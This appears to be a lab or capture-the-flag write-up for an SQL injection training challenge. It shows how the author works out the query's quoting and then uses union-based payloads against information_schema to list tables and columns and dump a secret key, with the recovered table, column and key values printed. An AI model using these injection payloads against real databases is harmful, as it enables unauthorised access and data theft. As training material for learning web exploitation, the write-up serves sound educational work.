## Challenge - 4

This challenge is similar to the previous three challenges and we have 14 tries to dump the secret key

### Initial Analysis

Here also we have to find  how the developer has given the query so we try giving id the values

```sql
0' or 1=1 --+
```

which doesn't give any output and id=

```sql
0" or 1=1 --+
```

gives an output which means the query should be like

```sql
select login_name,password from table_name where id="input"
```

### Solving

Now we can find table name like in the previous problem using

```sql
0" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='CHALLENGES'; --+
```

which gives us the table name :

**fgwsudgyn2**

Now we can find the columns in the table using 

```sql
0" union select 1,2,group_concat(column_name) from information_schema.columns where table_name='fgwsudgyn2' and table_schema='CHALLENGES'; --+
```

we get 4 column names:

**id,sessid,secret_90AH,tryy**

The secret key can be in any of these columns but we can always go for the most suspicious one and print the secret key using:

```sql
0" union select 1,2,group_concat(secret_90AH) from fgwsudgyn2; --+
```

We get the secret key:

**ji9RMwjJ3TKkFPrXK5F26Zo7**

